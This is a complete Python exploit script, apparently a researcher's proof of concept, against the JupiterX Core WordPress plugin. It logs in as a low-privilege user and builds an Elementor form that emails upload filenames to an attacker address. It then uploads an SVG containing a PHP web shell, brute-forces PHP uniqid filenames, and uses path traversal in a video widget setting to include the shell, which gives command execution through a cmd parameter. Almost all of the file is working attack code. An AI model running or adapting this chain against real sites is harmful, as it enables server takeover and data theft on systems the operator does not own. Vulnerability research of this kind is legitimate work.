import re
import time
from os.path import basename

import requests

"""
Author: Mat Rollings (stealthcopter)
Website: sec.stealthcopter.com
"""

USER = 'user'
PASSWORD = 'user'
METHOD = 'EMAIL'  # Either BRUTE or EMAIL
EMAIL_ADDRESS = 'attacker@vulnerability.com'  # If using email enter an email address to receive the filename to
TARGET = 'http://wordpress.local:1337'  # No trailing slash


PAYLOAD_FORM = '{"save_builder":{"action":"save_builder","data":{"status":"pending","elements":[{"id":"73965a6","elType":"container","isInner":false,"isLocked":false,"settings":{"raven_animated_gradient_color_list":[{"raven_animated_gradient_color":"#F6AD1F","_id":"20096a5"},{"raven_animated_gradient_color":"#F7496A","_id":"64ca7c6"},{"raven_animated_gradient_color":"#565AD8","_id":"10de5aa"}]},"elements":[{"id":"10ab6ec","elType":"widget","isInner":false,"isLocked":false,"settings":{"form_name":"New+form","fields":[{"_id":"856fd19","type":"file","acceptance_text":"I+agree+to+terms.","file_types":"svg","allow_multiple_upload":"true","step_previous_button":"Back","step_next_button":"Proceed","field_custom_id":"field_856fd19"}],"submit_button_text":"Send","label":"","actions":["email"],"email_to":"'+EMAIL_ADDRESS+'","email_subject":"New+message+from+\\"Your+Site+Title\\"","email_content":"[all-fields]","email_from":"email@wordpress.local","email_name":"Your+Site+Title","email_reply_to":"email@wordpress.local","email_to2":"'+EMAIL_ADDRESS+'","email_subject2":"New+message+from+\\"Your+Site+Title\\"","email_content2":"[all-fields]","email_from2":"email@wordpress.local","email_name2":"Your+Site+Title","email_reply_to2":"email@wordpress.local","activecampaign_fields_mapping":[],"convertkit_fields_mapping":[{"remote_field":"email","is_required":true,"_id":"378bd95"}],"drip_fields_mapping":[{"remote_field":"email","is_required":true,"_id":"c51c757"}],"getresponse_fields_mapping":[{"remote_field":"email","is_required":true,"_id":"c456466"}],"hubspot_mapping":[],"mailchimp_fields_mapping":[],"mailerlite_fields_mapping":[{"remote_field":"email","is_required":true,"_id":"89bfd91"}],"download_resource":"url","download_url":{"url":"https://stealthcopter.com/mat.jpg","is_external":"","nofollow":"","custom_attributes":"test\\"|or\'"},"popup_action":"open","messages_custom":"yes","messages_success":"The+form+was+sent+successfully!","messages_error":"Please+check+the+errors.","messages_required":"Required","messages_subscriber":"Subscriber+already+exists."},"elements":[],"title":"Form","categories":["jupiterx-core-raven-elements"],"keywords":["raven","jupiter","jupiterx"],"icon":"raven-element-icon+raven-element-icon-form","widgetType":"raven-form","hideOnSearch":false}]}],"settings":{"post_title":"JupiterX+Form","post_status":"pending"}}}}'

session = requests.session()


# Proxy can be uncommented here for debugging
# Recommend keeping it off for the bruteforce as the delay will impact the window size
# session.proxies = {'http': 'http://localhost:8080'}

def do_login(username, password):
    session.get(f'{TARGET}/wp-login.php')
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': 1
    }
    r = session.post(f'{TARGET}/wp-login.php', data=data, allow_redirects=False)

    if r.status_code == 302:
        print(f"[+] Login Successful")
        return True

    print(r.text)
    print(f"[-] Login Failed")


def get_next_post_id_and_api_nonce():
    r = session.get(f'{TARGET}/wp-admin/post-new.php')
    new_post_pattern = r'"rendered":\s*"http[^"]*\?p=([0-9]+)"'
    api_nonce_pattern = r'createNonceMiddleware\(\s*"([a-zA-Z0-9]+)"\s*\)'
    post = re.search(new_post_pattern, r.text)
    api_nonce = re.search(api_nonce_pattern, r.text)
    post_id = post.group(1)
    nonce = api_nonce.group(1)
    return post_id, nonce


def create_new_post(id, api_nonce):
    data = {
        'title': f'{basename(__file__)}',
        'content': '',
        'status': 'draft'
    }
    headers = {'X-WP-Nonce': api_nonce}
    r = session.post(f'{TARGET}/wp-json/wp/v2/posts/{id}', headers=headers, json=data)
    # print(r.text)
    if r.ok:
        return r.json()['id']


def get_nonce():
    r = session.get(f'{TARGET}/wp-admin/')
    nonce_pattern = r'"ajax"\s*:\s*\{[\s\r\n]*"url":\s*"[^"]*admin-ajax.php",[\s\r\n]*"nonce":\s*"([a-zA-Z0-9]+)"'
    nonce = re.search(nonce_pattern, r.text)
    return nonce.group(1)


def upload_form(nonce, post_id):
    data = {
        'action': 'elementor_ajax',
        'editor_post_id': post_id,
        'initial_document_id': post_id,
        '_nonce': nonce,
        'actions': PAYLOAD_FORM,
    }

    r = session.post(f'{TARGET}/wp-admin/admin-ajax.php', data=data)

    if not r.ok or not r.json()['success']:
        print(r.text)
        print(f"[!] Posting failed")
        return False
    print(r.json())
    return True


def get_form_ids(post_id):
    r = session.get(f'{TARGET}/?p={post_id}')

    field_pattern = r'type="file"\s*id="form-field-([a-zA-Z0-9]+)"'
    field = re.search(field_pattern, r.text)
    field = field.group(1) if field else None

    form_pattern = r'name="form_id"\s*value="([a-zA-Z0-9]+)"'
    form = re.search(form_pattern, r.text)
    form = form.group(1) if field else None

    return field, form

def upload_svgs(post_id, form_id, field_id, num_uploads):
    upload = (f'fields[{field_id}][]', ('shell.svg', '<?php system($_REQUEST[\'cmd\']);die();', 'image/svg+xml'))
    files = [upload] * num_uploads

    data = {
        'post_id':post_id,
        'form_id':form_id,
        'action': 'raven_form_frontend',
    }

    start_time = time.time()
    r = session.post(
        f'{TARGET}/wp-admin/admin-ajax.php',
        data=data,
        files=files
    )
    end_time = time.time()

    if r.json()['success']:
        print(f'[+] Upload Success')
        return start_time, end_time
    else:
        print(f'[!] Upload Failed\n{r.text}')


def php_uniqid(microtime):
    seconds = int(microtime)
    microseconds = int((microtime - seconds) * 1_000_000)

    hex_seconds = f"{seconds:x}"
    hex_microseconds = f"{microseconds:x}".zfill(5)  # PHP pads microseconds to 5 hex chars

    uniqid = hex_seconds + hex_microseconds

    return uniqid

def generate_possible_uniqids(start_microtime, end_microtime):
    resolution = 0.000001  # Microsecond resolution

    # Brute force loop
    possible_uniqids = []
    current_time = start_microtime

    while current_time <= end_microtime:
        uniqid = php_uniqid(current_time)
        possible_uniqids.append(uniqid)
        current_time += resolution

    return possible_uniqids


def create_lfi_post(nonce, post_id, uniqids):
    payloads = []
    for uniqid in uniqids:
        payloads.append('{"id":"617217f","elType":"widget","settings":{"start_time":"abc123","video_type":"hosted","show_device_frame":"yes","device_frame":"/../../../../../../../../uploads/jupiterx/forms/'+uniqid+'"},"title":"Advanced+Video","widgetType":"raven-video"}')

    PAYLOAD_LFI = '{"save_builder":{"action":"save_builder","data":{"status":"pending","elements":[{"id":"b561dd4","elType":"container","isInner":false,"isLocked":false,"elements":['+(','.join(payloads))+'],"settings":{"post_title":"Jupiter+Video","post_status":"pending"}}]}}}'

    data = {
        'action': 'elementor_ajax',
        'editor_post_id': post_id,
        'initial_document_id': post_id,
        '_nonce': nonce,
        'actions': PAYLOAD_LFI,
    }

    r = session.post(f'{TARGET}/wp-admin/admin-ajax.php', data=data)

    if not r.ok or not r.json()['success']:
        print(r.text)
        print(f"[!] Posting failed")
        return False

    return True

def test_lfi_post(post_id):
    r = session.get(f'{TARGET}/?p={post_id}&cmd=echo stealthcopter_reflection_test')
    return re.search(r'[^+]stealthcopter_reflection_test', r.text)

def exploit():
    if not do_login(USER, PASSWORD):
        return False

    nonce = get_nonce()
    if not nonce:
        print(f"[!] Error: Could not get nonce!")
        return False

    print(f"[+] Nonce: {nonce}")

    post_id, api_nonce = get_next_post_id_and_api_nonce()
    print(f"[+] Next Post ID: {post_id}")
    print(f"[+] API Nonce: {api_nonce}")

    if not post_id:
        print(f"[!] Error: Could not get next post id!")
        return False

    if not api_nonce:
        print(f"[!] Error: Could not get API nonce id!")
        return False

    post_id = create_new_post(post_id, api_nonce)

    if not post_id:
        print(f"[!] Error: Could not create new post with id: {post_id}!")
        return False

    print(f"[+] Post ID: {post_id}")

    # This little request lets Elementor steal the post, otherwise you'll get access denied
    try:
        session.get(f'{TARGET}/wp-admin/post.php?post={post_id}&action=elementor')
    except:
        # Catch some weird chunking error proxy is throwing...
        pass

    if not upload_form(nonce, post_id):
        print('[!] Error could not update post')
        return

    print(f"[+] Created Post with form: {post_id}")
    print(f"[+] Visit: {TARGET}/?p={post_id}")

    field_id, form_id = get_form_ids(post_id)

    if not field_id or not form_id:
        print(f"[!] Error: Could not get field or form ids! {form_id} {field_id}")
        return

    print(f"[+] Form ID: {form_id}")
    print(f"[+] Field ID: {field_id}")

    timing = upload_svgs(post_id, form_id, field_id, 10)

    if not timing:
        print(f"[!] Error: Could not upload SVGs")
        return False

    window = timing[1] - timing[0]

    print(f"[+] Window: {window}s ({timing[0]} - {timing[1]})")

    if METHOD == 'BRUTEFORCE':
        possible_ids = generate_possible_uniqids(timing[0], timing[1])

        # Reverse the list as we tend to be in last 95% or so of the timing (from my testing)
        possible_ids.reverse()

        print(f"[+] Possible Unique IDs: {len(possible_ids)}")

        chunk_size = 500

        print(f'[+] Creating a post to hit LFIs, testing {chunk_size} at a time')

        for i in range(0, len(possible_ids), chunk_size):
            chunk = possible_ids[i:i + chunk_size]

            print(f'{100 * i / len(possible_ids):.2f}% {i}/{len(possible_ids)}')
            create_lfi_post(nonce, post_id, chunk)

            if test_lfi_post(post_id):
                print('[+] Found LFI!!!')
                print(f"[+] Visit: {TARGET}/?p={post_id}&cmd=id;ls%20-lah")
                return
    else:
        print('Please enter an SVG filename, the filenames should be contained in an email you have received')
        svg_file_name = input('Enter File Name (e.g. 677c256fe7327): \n')

        create_lfi_post(nonce, post_id, [svg_file_name])

        if test_lfi_post(post_id):
            print('[+] Found LFI!!!')
            print(f"[+] Visit: {TARGET}/?p={post_id}&cmd=id;ls%20-lah")
            return


exploit()
